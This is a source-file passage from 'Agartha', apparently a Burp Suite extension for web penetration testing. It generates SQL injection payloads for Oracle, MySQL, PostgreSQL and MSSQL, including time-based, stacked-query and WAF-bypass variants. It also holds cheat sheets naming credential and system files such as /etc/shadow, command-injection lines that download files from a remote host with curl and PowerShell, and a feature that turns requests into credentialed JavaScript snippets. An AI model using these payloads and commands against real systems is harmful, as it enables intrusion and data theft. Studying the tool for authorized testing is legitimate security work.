                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(1,120) else null end from dual" + suffix + "\n")
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(1,120) else null end from dual" + "\n")
                                if self._cbSqlWafBypass.isSelected():
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),120) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),120) else null end from dual" + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message(1,120) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message(1,120) else null end from dual" + "\n")
                    if self._cbMysqlBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + ";select @@version" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " or sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=(select 1337 from (select sleep(120))A)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=(select 1337 from (select sleep(120))A)" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + " and sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + " and sleep(120)" + "\n")
                                listSQLi.append(prefix + " or sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + " or sleep(120)" + "\n")
                                listSQLi.append(prefix + ";select sleep(120)" + "\n")
                                listSQLi.append(prefix + ";select sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from (select sleep(120))A)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from (select sleep(120))A)" + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from (select sleep(120))A)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from (select sleep(120))A)" + "\n")
                                listSQLi.append(prefix + "sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + "sleep(120)" + "\n")
                    if self._cbPostgreBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select version()" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + ";select version()" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select pg_sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=(select 1337 from pg_sleep(120))" + suffix + "\n")                                    
                                listSQLi.append(prefix + escapeChar + " or 1337=(select 1337 from pg_sleep(120))" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + ";select pg_sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + ";select pg_sleep(120)" + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from pg_sleep(120))" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from pg_sleep(120))" + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from pg_sleep(120))" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from pg_sleep(120))" + "\n")
                    if self._cbMssqlBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select @@version" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + " waitfor delay " + escapeChar + "00:00:02" + escapeChar + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + ";waitfor delay " + escapeChar + "00:00:02" + escapeChar + suffix + "\n")
                            else:
                                listSQLi.append(prefix + " waitfor delay '00:00:02'" + suffix + "\n")
                                listSQLi.append(prefix + " waitfor delay '00:00:02'" + "\n")
                                listSQLi.append(prefix + ";waitfor delay '00:00:02'" + suffix + "\n")
                                listSQLi.append(prefix + ";waitfor delay '00:00:02'" + "\n")
                                if self._cbSqlWafBypass.isSelected():
                                    listSQLi.append(prefix + " waitfor delay \\'00:00:02\\'" + suffix + "\n")
                                    listSQLi.append(prefix + " waitfor delay \\'00:00:02\\'" + "\n")
                                    listSQLi.append(prefix + ";waitfor delay \\'00:00:02\\'" + suffix + "\n")
                                    listSQLi.append(prefix + ";waitfor delay \\'00:00:02\\'" + "\n")
        listSQLi = list(set(listSQLi))
        listSQLi.sort()
        if self._cbSqlEncoding.isSelected():
            listSQLi = self.encodeURL(listSQLi)
        self._tabDictResultDisplay.setText(''.join(map(str, listSQLi)))
        self._lblStatusLabel.setText('SQLi payload generation is returned with '+ str(len(listSQLi)) + ' records!')
        return

    def encodeURL(self, payloads):
        urlList = []
        for payload in payloads:
            urlList.append(payload.replace(" ", "%20").replace("'", "%27").replace("\"", "%22").replace("\\", "%5c").replace("=", "%3d").replace("<", "%3c").replace(";", "%3b").replace("|", "%7c").replace("&", "%26").replace(":", "%3a").replace("`", "%60").replace("#", "%23"))
        return urlList

    def getTabCaption(self):
        return "Agartha"

    def getUiComponent(self):
        return self._MainTabs

    def getHttpService(self):
        return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getHttpService()

    def getRequest(self):
        return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getRequest()

    def getResponse(self):
        return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getResponse()    

    def createMenuItems(self, invocation):
        self.context = invocation
        menu_list = ArrayList()
        menu_list.add(JMenuItem("Agartha Panel", actionPerformed=self.agartha_menu))
        menu_list.add(JMenuItem("Copy as JavaScript", actionPerformed=self.js_menu))
        return menu_list

    def js_menu(self,event):
        # right click menu
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        http_contexts = self.context.getSelectedMessages()
        _req = self._helpers.bytesToString(http_contexts[0].getRequest())
        _url = str(self._helpers.analyzeRequest(http_contexts[0]).getUrl())
        method = _req.splitlines()[0].split(" ", 1)[0]

        if "]" in _req.splitlines()[-1] or "}" in _req.splitlines()[-1] or ">" in _req.splitlines()[-1]:
            jscript = "JSON/XML is not supported yet :/"
        else:
            fullHeader = ""
            for line in _req.splitlines()[1:-1]:
                if line and not any(re.findall(r'cookie|token|auth', line, re.IGNORECASE)):
                    fullHeader += "xhr.setRequestHeader('" + line.split(":", 1)[0] + "','" + line.split(":", 1)[1] + "');"

            if method == "GET":
                minHeader = "var xhr=new XMLHttpRequest();xhr.open('GET','" + _url + "');xhr.withCredentials=true;"
                jscript = "Http request with minimum header paramaters in JavaScript:\n\t<script>" + minHeader + "xhr.send();</script>\n\n"
                jscript += "Http request with all header paramaters (except cookies, tokens, etc) in JavaScript, you may need to remove unnecessary fields:\n\t<script>" + minHeader + fullHeader + "xhr.send();</script>"
            else:
                contentType = ""
                for line in _req.splitlines():
                    if any(re.findall(r'Content-type', line, re.IGNORECASE)):
                        contentType = line.split(" ", 1)[1]
                        break
                if contentType:
                    contentType = "xhr.setRequestHeader('Content-type','" + contentType + "');"
                
                sendData = ""
                if _req.splitlines()[-1]:
                    sendData = "'" + _req.splitlines()[-1] + "'"
                
                minHeader = "var xhr=new XMLHttpRequest();xhr.open('" + method + "','" + _url + "');xhr.withCredentials=true;"
                jscript = "Http request with minimum header paramaters in JavaScript:\n\t<script>" + minHeader + contentType.strip() + "xhr.send(" + sendData + ");</script>\n\n"
                jscript += "Http request with all header paramaters (except cookies, tokens, etc) in JavaScript, you may need to remove unnecessary fields:\n\t<script>" + minHeader + fullHeader + "xhr.send(" + sendData + ");</script>"
            jscript += "\n\nFor redirection, please also add this code before '</script>' tag:\n\txhr.onreadystatechange=function(){if (this.status===302){var location=this.getResponseHeader('Location');return ajax.call(this,location);}};"
        
        clipboard.setContents(StringSelection(jscript), None)

    def agartha_menu(self,event):
        # right click menu
        http_contexts = self.context.getSelectedMessages()
        _req = self._helpers.bytesToString(http_contexts[0].getRequest())
        _url = ""
        for http_context in http_contexts:
            _url += str(self._helpers.analyzeRequest(http_context).getUrl()) + "\n"

        if _url.startswith("https"):
            _url = _url.replace(":443/", "/")
        elif _url.startswith("http"):
            _url = _url.replace(":80/", "/")
            
        self._tbAuthHeader.setText(_req)
        self._tbAuthURL.setText(_url)
        self._MainTabs.setSelectedComponent(self._tabAuthSplitpane)
        self._MainTabs.getParent().setSelectedComponent(self._MainTabs)

    def authMatrix(self, ev):
        t = Thread(target=self.authMatrixThread, args=[self])
        t.start()
        return

    def _updateReqResView(self, ev):
        try:
            row = self.tableMatrix.getSelectedRow()
            userID = self.tableMatrix.getSelectedColumn()
            if userID == 0:
                self._requestViewer.setMessage("", False)
                self._responseViewer.setMessage("", False)
            else:
                self._requestViewer.setMessage(self.httpReqRes[userID-1][row].getRequest(), False)
                self._responseViewer.setMessage(self.httpReqRes[userID-1][row].getResponse(), False)
        except:
            self._requestViewer.setMessage("", False)
            self._responseViewer.setMessage("", False)
    
    def isURLValid(self, urlAdd):
        if " " in urlAdd.strip():
            return False
        elif urlAdd.startswith("http"):
            return True
        else:
            #white space exception
            if urlAdd:
                return False
            else:
                return True

    def _tabAuthUI(self):
        #panel top
        self._tbAuthNewUser = JTextField("", 15)
        self._tbAuthNewUser.setToolTipText("Please provide an username")
        self._btnAuthNewUserAdd = JButton("Add User", actionPerformed=self.authAdduser)
        self._btnAuthNewUserAdd.setPreferredSize(Dimension(90,27))
        self._btnAuthNewUserAdd.setToolTipText("Please add user/s to populate authentication matrix!")
        self._btnAuthRun = JButton("RUN", actionPerformed=self.authMatrix)
        self._btnAuthRun.setPreferredSize(Dimension(150,27))
        self._btnAuthRun.setToolTipText("Start comparison")
        self._btnAuthReset = JButton("Reset", actionPerformed=self.tableMatrixReset)
        self._btnAuthReset.setPreferredSize(Dimension(90,27))
        self._btnAuthReset.setToolTipText("Clear all")
        self._btnAuthRun.setEnabled(False)
        self._btnAuthReset.setEnabled(False)       
        self._tbAuthHeader = JTextPane()
        self._tbAuthHeader.setContentType("text")
        self._tbAuthHeader.setToolTipText("HTTP request belons to the user. You may copy and paste it from Repater/Proxy")
        self._tbAuthHeader.setEditable(True)
        self._tbAuthURL = JTextPane()
        self._tbAuthURL.setContentType("text")
        self._tbAuthURL.setToolTipText("What url links can be accessible by her/him. Please dont forget to remove logout links!")
        self._tbAuthURL.setEditable(True)
        self._cbAuthColoring = JCheckBox('Warnings', False, itemStateChanged=self._cbAuthColoringFunc)
        self._cbAuthColoring.setEnabled(False)
        self._cbAuthColoring.setToolTipText("Colors may help to analysis easily")
        self._cbAuthGETPOST = JComboBox(('GET', 'POST'))
        self._cbAuthGETPOST.setSelectedIndex(0)
        self._cbAuthGETPOST.setToolTipText("Which HTTP method will be used for the test")

        #top panel
        _tabAuthPanel1 = JPanel(BorderLayout())
        _tabAuthPanel1.setBorder(EmptyBorder(0, 0, 10, 0))
        _tabAuthPanel1_A = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabAuthPanel1_A.setPreferredSize(Dimension(400,105))
        _tabAuthPanel1_A.setMinimumSize(Dimension(400,105))
        _tabAuthPanel1_A.add(self._btnAuthNewUserAdd)
        _tabAuthPanel1_A.add(self._tbAuthNewUser)
        _tabAuthPanel1_A.add(self._cbAuthGETPOST)
        _tabAuthPanel1_A.add(self._btnAuthReset)
        _tabAuthPanel1_A.add(self._btnAuthRun)
        _tabAuthPanel1_A.add(self._cbAuthColoring)
        _tabAuthPanel1_B = JScrollPane(self._tbAuthHeader, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        _tabAuthPanel1_C = JScrollPane(self._tbAuthURL, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        self._tabAuthSplitpaneHttp = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, _tabAuthPanel1_B, _tabAuthPanel1_C)
        _tabAuthPanel1.add(_tabAuthPanel1_A,BorderLayout.WEST)
        _tabAuthPanel1.add(self._tabAuthSplitpaneHttp,BorderLayout.CENTER)
        #panel top

        #panel center
        self._lblAuthNotification = JLabel("", SwingConstants.LEFT)
        self.tableMatrix = []
        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLS','NoAuth'))
        self.tableMatrix = JTable(self.tableMatrix_DM)        
        self.tableMatrix.setAutoCreateRowSorter(False)
        self.tableMatrix.setSelectionForeground(Color.red)
        self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.getColumnModel().getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.setOpaque(True)
        self.tableMatrix.setFillsViewportHeight(True)
        self.tableMatrix_SP = JScrollPane()
        self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
        _tabAuthPanel2 = JPanel()
        _tabAuthPanel2.setLayout(BoxLayout(_tabAuthPanel2, BoxLayout.Y_AXIS))
        _tabAuthPanel2.add(self._lblAuthNotification,BorderLayout.NORTH)
        _tabAuthPanel2.add(self.tableMatrix_SP,BorderLayout.NORTH)
        self.progressBar = JProgressBar()
        self.progressBar.setMaximum(1000000)
        self.progressBar.setMinimum(0)
        _tabAuthPanel2.add( self.progressBar, BorderLayout.SOUTH)
        #panel center

        self._tabAuthPanel = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthPanel.setBorder(EmptyBorder(10, 10, 10, 10))
        self._tabAuthPanel.setTopComponent(_tabAuthPanel1)
        self._tabAuthPanel.setBottomComponent(_tabAuthPanel2)

        #panel bottom
        _tabsReqRes = JTabbedPane()        
        self._requestViewer = self._callbacks.createMessageEditor(self, False)
        self._responseViewer = self._callbacks.createMessageEditor(self, False)
        _tabsReqRes.addTab("Request", self._requestViewer.getComponent())
        _tabsReqRes.addTab("Response", self._responseViewer.getComponent())
        #panel bottom

        self._tabAuthSplitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthSplitpane.setTopComponent(self._tabAuthPanel)
        self._tabAuthSplitpane.setBottomComponent(_tabsReqRes)

    def _tabDictUI(self):
        #top panel
        self._txtDefaultLFI = "Example: 'etc/passwd', 'C:\\boot.ini'"
        self._txtDefaultCommandInj = "Examples: $'sleep 120', >'timeout 120' - for 2 minutes"
        self._txtDefaultSQLi = "No input is needed to supply!"
        self._txtCheatSheetLFI = ""
        self._txtCheatSheetLFI += "Directory Traversal Linux\t\t\tDirectory Traversal Windows\n"
        self._txtCheatSheetLFI += "\t/etc/passwd\t\t\t\tC:\\boot.ini\n"
        self._txtCheatSheetLFI += "\t/etc/profile\t\t\t\t\tC:\\windows\\win.ini\n"
        self._txtCheatSheetLFI += "\t/proc/self/environ\t\t\t\tC:\\windows\\system.ini\n"
        self._txtCheatSheetLFI += "\t/proc/self/status\t\t\t\tC:\\windows\\system32\\notepad.exe\n"
        self._txtCheatSheetLFI += "\t/etc/hosts\t\t\t\t\tC:\\windows\\system32\\drivers\\etc\\hosts\n"
        self._txtCheatSheetLFI += "\t/etc/shadow\t\t\t\tC:\\windows\\system32\\license.rtf\n"
        self._txtCheatSheetLFI += "\t/etc/group\t\t\t\t\tC:\\users\\public\\desktop\\desktop.ini\n"
        self._txtCheatSheetLFI += "\t/var/log/auth.log\t\t\t\tC:\\windows\\system32\\eula.txt\n"
        
        self._txtCheatSheetCommandInj = ""
        self._txtCheatSheetCommandInj += "Command Inj Unix\t\t\t\t\tCommand Inj Windows\n"
        self._txtCheatSheetCommandInj += "\tcat /etc/passwd\t\t\t\t\tcmd.exe?/c type file.txt\n"
        self._txtCheatSheetCommandInj += "\tuname -a\t\t\t\t\t\tsysteminfo\n"
        self._txtCheatSheetCommandInj += "\t/usr/bin/id\t\t\t\t\t\twhoami /priv\n"
        self._txtCheatSheetCommandInj += "\tping -c 10 X.X.X.X\t\t\t\t\tping -n 10 X.X.X.X\n"
        self._txtCheatSheetCommandInj += "\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\users\\public\\file.txt')\n"       
        _lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
        _lblDepth.setToolTipText("Generate payloads only for some certain folder depth.")
        _btnGenerateDict = JButton("Generate the Payload", actionPerformed=self.funcGeneratePayload)
        _btnGenerateDict.setToolTipText("Click to generate payloads.")
        self._lblStatusLabel = JLabel()
        self._lblStatusLabel.setText("Please provide a path for payload generation!")
        self._txtTargetPath = JTextField(self._txtDefaultLFI, 30)
        self._rbDictLFI = JRadioButton('DT/LFI', True, itemStateChanged=self.funcRBSelection);
        self._rbDictLFI.setToolTipText("It generates payload for Directory Traversal, Local File Inclusion, Remote File Inclusion.")
        self._rbDictCommandInj = JRadioButton('Command Inj / RCE', itemStateChanged=self.funcRBSelection)
        self._rbDictCommandInj.setToolTipText("It generates payload for Command Injection, Remote Code Execution.")
        self._rbDictSQLi = JRadioButton('SQLi', itemStateChanged=self.funcRBSelection)
        self._rbDictSQLi.setToolTipText("It generates payload for SQL Injection attacks, including Stack Queries, Boolean-Based, Time-Based, Union-Based, Order-Based injections.")
        _rbDictCheatSheet = JRadioButton('Cheat Sheet', itemStateChanged=self.funcRBSelection)
        _rbDictFuzzer = JRadioButton('Fuzzer', itemStateChanged=self.funcRBSelection)
        _rbPanel = JPanel()
        _rbPanel.add(self._rbDictLFI)
        _rbPanel.add(self._rbDictCommandInj)
        _rbPanel.add(self._rbDictSQLi)
        _rbGroup = ButtonGroup()
        _rbGroup.add(self._rbDictLFI)
        _rbGroup.add(self._rbDictCommandInj)
        _rbGroup.add(self._rbDictSQLi)
        _rbGroup.add(_rbDictCheatSheet)
        _rbGroup.add(_rbDictFuzzer)
        self._cbDictWafBypass = JCheckBox('Waf Bypass', True)
        self._cbDictWafBypass.setToolTipText("It includes protection bypass techniques, like null bytes, encoding, etc.")
        self._cbDictEquality = JCheckBox(')', False)
        self._cbDictEquality.setToolTipText("Generate payloads only for some certain folder depth.")
        self._cbDictDepth = JComboBox(list(range(0, 20)))        
        self._cbDictDepth.setSelectedIndex(5)
        self._cbDictDepth.setToolTipText("How deep the folder depth should be?")
        _cbDictDepthPanel = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        _cbDictDepthPanel.add(self._cbDictDepth)
        self._cbDictCommandInjEncoding = JCheckBox('URL Encoding', False)
        self._cbDictCommandInjEncoding.setToolTipText("Encodes the payload outcome.")
        self._cbDictCommandInjOpt = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._cbDictCommandInjOpt.add(self._cbDictCommandInjEncoding)
        self._cbDictCommandInjOpt.setVisible(False)
        self._cbStackedSQL = JCheckBox('Stacked Queries', False)
        self._cbStackedSQL.setToolTipText("Stacked Query SQL Injection")
        self._cbTimeBased = JCheckBox('Time-Based', True)
        self._cbTimeBased.setToolTipText("Time-Based SQL Injection")
        self._cbUnionBased = JCheckBox('Union-Based', False, itemStateChanged=self._cbUnionBasedFunc)
        self._cbUnionBased.setToolTipText("Union-Based SQL Injection")
        self._cbUnionDepth = JComboBox(list(range(1, 20)))
        self._cbUnionDepth.setSelectedIndex(4)
        self._cbUnionDepth.setEnabled(False)
        self._cbUnionDepth.setToolTipText("Generates payload till")
        self._cbOrderBased = JCheckBox('Order-Based', False, itemStateChanged=self._cbOrderBasedFunc)
        self._cbOrderBased.setToolTipText("Order-Based SQL Injection")
        self._cbOrderDepth = JComboBox(list(range(1, 20)))
        self._cbOrderDepth.setSelectedIndex(4)
        self._cbOrderDepth.setEnabled(False)
        self._cbOrderDepth.setToolTipText("Generates payload till")
        self._cbBooleanBased = JCheckBox('Boolean-Based', True)
        self._cbBooleanBased.setToolTipText("Boolean-Based SQL Injection")
        self._cbMssqlBased = JCheckBox('MSSQL', True)
        self._cbMssqlBased.setToolTipText("Select database to include.")
        self._cbMysqlBased = JCheckBox('MYSQL', True)
        self._cbMysqlBased.setToolTipText("Select database to include.")
        self._cbPostgreBased = JCheckBox('POSTGRESQL', True)
        self._cbPostgreBased.setToolTipText("Select database to include.")
        self._cbOracleBased = JCheckBox('ORACLE', True)
        self._cbOracleBased.setToolTipText("Select database to include.")
        self._cbSqlWafBypass = JCheckBox('Waf Bypass', True)
        self._cbSqlWafBypass.setToolTipText("It includes protection bypass techniques, like null bytes, encoding, etc.")
        self._cbSqlEncoding = JCheckBox('URL Encoding', False)
        self._cbSqlEncoding.setToolTipText("Encodes the payload outcome.")
        _tabDictPanel_1 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabDictPanel_1.add(self._txtTargetPath, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_btnGenerateDict, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_rbPanel, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_LFI.add(_lblDepth, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(self._cbDictEquality, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(_cbDictDepthPanel, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(self._cbDictWafBypass, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.setVisible(True)
        self._tabDictPanel_SQLType = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLType.add(self._cbMysqlBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbPostgreBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbMssqlBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbOracleBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.setVisible(False)
        self._tabDictPanel_SQLOptions = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLOptions.add(self._cbSqlEncoding, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLOptions.add(self._cbSqlWafBypass, BorderLayout.PAGE_START)        
        self._tabDictPanel_SQLOptions.setVisible(False)
        self._tabDictPanel_SQLi = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLi.add(self._cbStackedSQL, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbBooleanBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbTimeBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbUnionBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbUnionDepth, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbOrderBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbOrderDepth, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.setVisible(False)
        _tabDictPanel_1.add(self._tabDictPanel_LFI, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._cbDictCommandInjOpt, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLType, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLOptions, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLi, BorderLayout.PAGE_START)
        _tabDictPanel_1.setPreferredSize(Dimension(400,90))
        _tabDictPanel_1.setMinimumSize(Dimension(400,90))
        #top panel

        #center panel
        _tabDictPanel_2 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        _tabDictPanel_2.add(self._lblStatusLabel)
        #center panel
        
        #bottom panel 
        self._tabDictResultDisplay = JTextPane()
        self._tabDictResultDisplay.setFont(self._tabDictResultDisplay.getFont().deriveFont(Font.PLAIN, 14))
        self._tabDictResultDisplay.setContentType("text")
        self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
        self._tabDictResultDisplay.setEditable(False)
        _tabDictPanel_3 = JPanel(BorderLayout(10, 10))
        _tabDictPanel_3.setBorder(EmptyBorder(10, 0, 0, 0))
        _tabDictPanel_3.add(JScrollPane(self._tabDictResultDisplay), BorderLayout.CENTER)
        #bottom panel 

        self._tabDictPanel = JPanel()
        self._tabDictPanel.setLayout(BoxLayout(self._tabDictPanel, BoxLayout.Y_AXIS))
        self._tabDictPanel.add(_tabDictPanel_1)
        self._tabDictPanel.add(_tabDictPanel_2)
        self._tabDictPanel.add(_tabDictPanel_3)

    def tableMatrixReset(self, ev):
        self.tableMatrix = []        
        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLS','NoAuth'))
        self.tableMatrix = JTable(self.tableMatrix_DM)
        self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
        self.userCount = 0
        self.userNames = []
        self.userNames.append("NoAuth")
        self.userNamesHttpReq = []
        self.userNamesHttpReq.append("")
        self.userNamesHttpUrls = [[]]
        self.httpReqRes = [[],[],[],[],[]]
        self.httpReqRes.append([])
        self._requestViewer.setMessage("", False)
        self._responseViewer.setMessage("", False)
        self._lblAuthNotification.text = "Please add users to create an auth matrix"
        self._tbAuthNewUser.setForeground (Color.black)        
        self._txtHeaderDefault = "GET / HTTP/1.1\nHost: localhost\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: SessionID=......."
        self._tbAuthHeader.setText(self._txtHeaderDefault)
        self._txtURLDefault = "http://...."
        self._tbAuthURL.setText(self._txtURLDefault)
        self._txtUserDefault = "User1"
        self._tbAuthNewUser.text = self._txtUserDefault
        self._btnAuthRun.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)
        self._cbAuthGETPOST.setSelectedIndex(0)
        self._btnAuthNewUserAdd.setEnabled(True)
        self.progressBar.setValue(0)
        self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.getColumnModel().getSelectionModel().addListSelectionListener(self._updateReqResView)
        self._tabAuthSplitpaneHttp.setDividerLocation(0.5)
        self._tabAuthPanel.setDividerLocation(0.25)
        self._tabAuthSplitpane.setDividerLocation(0.7)        
        return

class UserEnabledRenderer(TableCellRenderer):
    def __init__(self, defaultCellRender, userNamesHttpUrls):
        self._defaultCellRender = defaultCellRender
        self.urlList = userNamesHttpUrls
        self.colorsUser = [Color(204, 229, 255), Color(204, 255, 204), Color(204, 204, 255), Color(255,228,196)]        
        self.colorsAlert = [Color.white, Color(255, 153, 153), Color(255,218,185), Color(255, 255, 204), Color(211,211,211)]

    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        cell = self._defaultCellRender.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column)
        toolTipMessage = ""
        cell.setBackground(self.colorsAlert[0])
        try:
            if column == 0:
                #URL section - default whitee
                cell.setBackground(self.colorsAlert[0])
                toolTipMessage = "Requested URLs!"
            elif table.getValueAt(row, column) and not table.getValueAt(row, column).startswith("HTTP 2") and not table.getValueAt(row, column).startswith("HTTP 3"):
                #error or http 4XX/5XX
                cell.setBackground(self.colorsAlert[4])
                toolTipMessage = "The request returns HTTP 4XX/5xx response!"
            elif column == 1:
                #no auth
                cell.setBackground(self.colorsAlert[0])
                if _colorful:
                    for y in range(2,table.getColumnCount()):                        
                        if table.getValueAt(row, y) == table.getValueAt(row, column):                        
                            if table.getValueAt(row, y).startswith("HTTP 2"):
                                cell.setBackground(self.colorsAlert[1])
                                toolTipMessage = "The URL returns HTTP 2XX without authentication!"
                            elif table.getValueAt(row, y).startswith("HTTP 3"):
                                if not cell.getBackground() == self.colorsAlert[1]:
                                    #cell.setBackground(self.colorsAlert[3])
                                    toolTipMessage = "The URL returns HTTP 3XX without authentication!"
                        elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                                if not cell.getBackground() == self.colorsAlert[1]:
                                    cell.setBackground(self.colorsAlert[2])
                                    toolTipMessage = "The URL returns HTTP 2XX with different length and without authentication!"
            elif table.getValueAt(row, 0) in self.urlList[column- 1]:
                cell.setBackground(self.colorsUser[column-2])
                toolTipMessage = "Http response of the user's own URL!"
            else:    
                #other users
                cell.setBackground(self.colorsAlert[0])
                if _colorful:
                    for y in range(2,table.getColumnCount()):
                        if table.getValueAt(row, y) == table.getValueAt(row, column):
                        # responses are same: red or yellow
                            if table.getValueAt(row, y).startswith("HTTP 2"):
                                cell.setBackground(self.colorsAlert[1])
                                toolTipMessage = "The URL is not in the user's list but returns HTTP 2XX!"
                            elif table.getValueAt(row, y).startswith("HTTP 3"):
                                if not cell.getBackground() == self.colorsAlert[1]:
                                    cell.setBackground(self.colorsAlert[3])
                                    toolTipMessage = "The URL is not in the user's list and returns HTTP 3XX!"
                        elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                        # response lengths are different, but responses code might be the same
                            if not cell.getBackground() == self.colorsAlert[1]:    
                                cell.setBackground(self.colorsAlert[2])
                                toolTipMessage = "The URL is not in the user's list but returns HTTP 2XX with different length!"
        except:
            cell.setBackground(self.colorsAlert[0])

        if isSelected:            
            cell.setBackground(Color(240,240,240))
            
        if hasFocus:           
            cell.setBackground(Color(240,240,240))
